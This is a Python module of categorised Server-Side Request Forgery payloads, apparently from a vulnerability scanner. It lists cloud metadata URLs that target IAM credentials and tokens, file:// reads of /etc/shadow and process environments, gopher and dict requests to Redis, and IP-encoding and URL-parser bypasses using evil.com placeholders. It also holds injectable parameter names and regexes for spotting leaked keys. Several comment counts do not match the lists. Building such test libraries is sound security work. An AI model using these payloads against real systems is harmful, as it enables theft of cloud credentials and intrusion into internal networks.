"""
SSRF (Server-Side Request Forgery) Payloads
============================================
Generic payloads for detecting SSRF vulnerabilities.
These payloads are NOT application-specific.

Categories:
1. Internal Network Access (localhost, 127.0.0.1, internal IPs)
2. Cloud Metadata Services (AWS, GCP, Azure, DigitalOcean)
3. Protocol Smuggling (file://, gopher://, dict://)
4. IP Obfuscation (decimal, hex, octal, IPv6)
5. DNS Rebinding (time-based detection)
6. URL Parser Bypass (@ tricks, fragment bypass)

Reference: OWASP WSTG-INPV-19
"""

from typing import List, Dict, Any

# =============================================================================
# CATEGORY 1: INTERNAL NETWORK ACCESS (12 payloads)
# =============================================================================
INTERNAL_NETWORK_PAYLOADS = [
    # Basic localhost
    "http://localhost/",
    "http://localhost:80/",
    "http://localhost:443/",
    "http://localhost:22/",
    "http://localhost:3306/",
    "http://localhost:6379/",
    "http://localhost:27017/",
    
    # 127.0.0.1 variations
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:9000/",
    
    # Internal IP ranges (RFC 1918)
    "http://10.0.0.1/",
    "http://10.0.0.1:8080/",
    "http://172.16.0.1/",
    "http://172.16.0.1:8080/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://192.168.1.1:8080/",
    
    # Internal hostnames
    "http://internal/",
    "http://intranet/",
    "http://backend/",
    "http://api/",
    "http://admin/",
    "http://db/",
    "http://database/",
    "http://mysql/",
    "http://redis/",
    "http://mongodb/",
    "http://elasticsearch/",
]

# =============================================================================
# CATEGORY 2: CLOUD METADATA SERVICES (15 payloads)
# =============================================================================
CLOUD_METADATA_PAYLOADS = [
    # AWS EC2 Metadata (IMDSv1)
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/user-data/",
    
    # AWS ECS Task Metadata
    "http://169.254.170.2/v2/credentials/",
    
    # Google Cloud Platform (GCP)
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/",
    "http://169.254.169.254/computeMetadata/v1/",
    
    # Azure Instance Metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1.json",
    
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    
    # OpenStack
    "http://169.254.169.254/openstack/latest/meta_data.json",
]

# =============================================================================
# CATEGORY 3: PROTOCOL SMUGGLING (12 payloads)
# =============================================================================
PROTOCOL_SMUGGLING_PAYLOADS = [
    # File protocol
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/net/tcp",
    "file://localhost/etc/passwd",
    "file://127.0.0.1/etc/passwd",
    
    # Windows file paths
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "file:///c:/boot.ini",
    
    # Gopher protocol (for Redis, SMTP, etc.)
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_KEYS%20*",
    "gopher://127.0.0.1:11211/_stats",
    "gopher://127.0.0.1:25/_EHLO%20localhost",
    
    # Dict protocol
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",
    
    # LDAP protocol
    "ldap://127.0.0.1:389/",
    "ldap://localhost/",
    
    # FTP protocol
    "ftp://127.0.0.1/",
    "ftp://localhost/",
    
    # TFTP protocol
    "tftp://127.0.0.1/test",
]

# =============================================================================
# CATEGORY 4: IP OBFUSCATION (15 payloads)
# =============================================================================
IP_OBFUSCATION_PAYLOADS = [
    # Decimal encoding (127.0.0.1 = 2130706433)
    "http://2130706433/",
    "http://2130706433:80/",
    
    # Hexadecimal encoding
    "http://0x7f000001/",
    "http://0x7f.0x0.0x0.0x1/",
    "http://0x7f000001:80/",
    
    # Octal encoding
    "http://0177.0.0.01/",
    "http://0177.0000.0000.0001/",
    
    # Mixed encoding
    "http://127.0.0x0.1/",
    "http://127.0.0.0x1/",
    
    # IPv6 localhost
    "http://[::1]/",
    "http://[::1]:80/",
    "http://[0000:0000:0000:0000:0000:0000:0000:0001]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:7f00:0001]/",
    
    # IPv6 compressed formats
    "http://[0:0:0:0:0:0:0:1]/",
    "http://[::]/",
    
    # Shortened IP (127.1 = 127.0.0.1)
    "http://127.1/",
    "http://127.0.1/",
    
    # CIDR notation tricks
    "http://127.0.0.1%00@evil.com/",
    "http://127.0.0.1%0d%0a@evil.com/",
]

# =============================================================================
# CATEGORY 5: URL PARSER BYPASS (12 payloads)
# =============================================================================
URL_PARSER_BYPASS_PAYLOADS = [
    # @ symbol tricks (user:pass@host)
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1@evil.com/",
    "http://evil.com:80@127.0.0.1/",
    "http://anything@127.0.0.1/",
    
    # Fragment bypass
    "http://127.0.0.1#@evil.com/",
    "http://evil.com#@127.0.0.1/",
    
    # Backslash tricks
    "http://evil.com\\@127.0.0.1/",
    "http://127.0.0.1\\@evil.com/",
    
    # URL encoding tricks
    "http://127.0.0.1%2f@evil.com/",
    "http://127%2e0%2e0%2e1/",
    "http://%31%32%37%2e%30%2e%30%2e%31/",
    
    # Double URL encoding
    "http://%252f%252f127.0.0.1/",
    
    # Unicode normalization
    "http://127.0.0.1%ef%bc%8f@evil.com/",
    
    # Null byte injection
    "http://127.0.0.1%00.evil.com/",
    "http://evil.com%00127.0.0.1/",
    
    # Tab/newline injection
    "http://127.0.0.1%09/",
    "http://127.0.0.1%0a/",
    "http://127.0.0.1%0d/",
]

# =============================================================================
# CATEGORY 6: DNS REBINDING (8 payloads)
# =============================================================================
DNS_REBINDING_PAYLOADS = [
    # Common DNS rebinding services (placeholders - need actual rebinding domain)
    "http://localtest.me/",  # Resolves to 127.0.0.1
    "http://127.0.0.1.nip.io/",
    "http://127.0.0.1.sslip.io/",
    "http://127.0.0.1.xip.io/",
    
    # Spoofed DNS
    "http://spoofed.burpcollaborator.net/",  # Placeholder
    "http://attacker-rebind.com/",  # Placeholder
    
    # Short domains that might resolve to internal
    "http://r.local/",
    "http://corp/",
]

# =============================================================================
# CATEGORY 7: REDIRECT/OPEN REDIRECT SSRF (8 payloads)
# =============================================================================
REDIRECT_SSRF_PAYLOADS = [
    # Using URL shorteners (conceptual)
    "http://bit.ly/redirect-to-internal",
    "http://tinyurl.com/redirect-internal",
    
    # Double encoding redirect
    "http://evil.com/redirect?url=http://127.0.0.1/",
    "http://evil.com/redirect?url=http%3A%2F%2F127.0.0.1%2F",
    
    # Using # to bypass validation
    "http://expected-domain.com#http://127.0.0.1/",
    
    # Data URI (if supported)
    "data:text/html,<script>fetch('http://127.0.0.1/')</script>",
]

# =============================================================================
# CATEGORY 8: SPECIAL ENDPOINTS (8 payloads)
# =============================================================================
SPECIAL_ENDPOINT_PAYLOADS = [
    # Kubernetes internal services
    "http://kubernetes.default.svc/",
    "http://kubernetes.default/",
    
    # Docker internal
    "http://host.docker.internal/",
    "http://docker.for.mac.localhost/",
    "http://docker.for.win.localhost/",
    
    # Common internal APIs
    "http://consul:8500/v1/agent/services",
    "http://vault:8200/v1/sys/health",
    "http://etcd:2379/version",
    
    # AWS internal services
    "http://instance-data/",
]

# =============================================================================
# COMBINED PAYLOAD LISTS
# =============================================================================

def get_all_ssrf_payloads() -> List[str]:
    """Get all SSRF payloads combined."""
    all_payloads = []
    all_payloads.extend(INTERNAL_NETWORK_PAYLOADS)
    all_payloads.extend(CLOUD_METADATA_PAYLOADS)
    all_payloads.extend(PROTOCOL_SMUGGLING_PAYLOADS)
    all_payloads.extend(IP_OBFUSCATION_PAYLOADS)
    all_payloads.extend(URL_PARSER_BYPASS_PAYLOADS)
    all_payloads.extend(DNS_REBINDING_PAYLOADS)
    all_payloads.extend(REDIRECT_SSRF_PAYLOADS)
    all_payloads.extend(SPECIAL_ENDPOINT_PAYLOADS)
    return all_payloads


def get_ssrf_payloads_by_category() -> Dict[str, List[str]]:
    """Get SSRF payloads organized by category."""
    return {
        "internal_network": INTERNAL_NETWORK_PAYLOADS,
        "cloud_metadata": CLOUD_METADATA_PAYLOADS,
        "protocol_smuggling": PROTOCOL_SMUGGLING_PAYLOADS,
        "ip_obfuscation": IP_OBFUSCATION_PAYLOADS,
        "url_parser_bypass": URL_PARSER_BYPASS_PAYLOADS,
        "dns_rebinding": DNS_REBINDING_PAYLOADS,
        "redirect_ssrf": REDIRECT_SSRF_PAYLOADS,
        "special_endpoints": SPECIAL_ENDPOINT_PAYLOADS,
    }


def get_ssrf_detection_patterns() -> List[str]:
    """Regex patterns to detect SSRF vulnerabilities in responses."""
    return [
        # Internal IP indicators
        r"127\.0\.0\.1",
        r"localhost",
        r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
        r"172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}",
        r"192\.168\.\d{1,3}\.\d{1,3}",
        
        # Cloud metadata indicators
        r"ami-[a-f0-9]+",  # AWS AMI ID
        r"i-[a-f0-9]+",    # AWS Instance ID
        r"arn:aws:",       # AWS ARN
        r"AccessKeyId",    # AWS credentials
        r"SecretAccessKey",
        r"Token",
        
        # File content indicators
        r"root:.*:0:0:",   # /etc/passwd
        r"\[boot loader\]", # Windows boot.ini
        r"\[extensions\]",  # Windows win.ini
        
        # Error messages indicating SSRF attempt
        r"Connection refused",
        r"Connection timed out",
        r"No route to host",
        r"Network is unreachable",
        r"couldn't connect to host",
        r"getaddrinfo failed",
        
        # Internal service indicators
        r"Redis Version",
        r"MongoDB server version",
        r"mysql_native_password",
    ]


def get_ssrf_test_endpoints() -> List[str]:
    """Common URL parameters that may be vulnerable to SSRF."""
    return [
        "url",
        "uri",
        "path",
        "dest",
        "redirect",
        "redirect_uri",
        "redirect_url",
        "callback",
        "return",
        "return_url",
        "next",
        "next_url",
        "target",
        "rurl",
        "domain",
        "feed",
        "host",
        "site",
        "html",
        "data",
        "load",
        "page",
        "reference",
        "file",
        "filename",
        "image",
        "image_url",
        "img",
        "img_url",
        "picture",
        "avatar",
        "avatar_url",
        "gravatar",
        "link",
        "src",
        "source",
        "from",
        "fetch",
        "proxy",
        "forward",
        "remote",
    ]


# =============================================================================
# PAYLOAD METADATA
# =============================================================================
SSRF_PAYLOAD_INFO = {
    "total_count": len(get_all_ssrf_payloads()),
    "categories": {
        "internal_network": len(INTERNAL_NETWORK_PAYLOADS),
        "cloud_metadata": len(CLOUD_METADATA_PAYLOADS),
        "protocol_smuggling": len(PROTOCOL_SMUGGLING_PAYLOADS),
        "ip_obfuscation": len(IP_OBFUSCATION_PAYLOADS),
        "url_parser_bypass": len(URL_PARSER_BYPASS_PAYLOADS),
        "dns_rebinding": len(DNS_REBINDING_PAYLOADS),
        "redirect_ssrf": len(REDIRECT_SSRF_PAYLOADS),
        "special_endpoints": len(SPECIAL_ENDPOINT_PAYLOADS),
    },
    "reference": "OWASP WSTG-INPV-19",
    "description": "Server-Side Request Forgery payloads for testing URL handling",
}


if __name__ == "__main__":
    # Print payload statistics
    print("=" * 60)
    print("SSRF PAYLOAD STATISTICS")
    print("=" * 60)
    
    info = SSRF_PAYLOAD_INFO
    print(f"\nTotal Payloads: {info['total_count']}")
    print(f"\nBreakdown by Category:")
    for category, count in info['categories'].items():
        print(f"  - {category}: {count}")
    
    print(f"\nTest Endpoint Parameters: {len(get_ssrf_test_endpoints())}")
    print(f"Detection Patterns: {len(get_ssrf_detection_patterns())}")
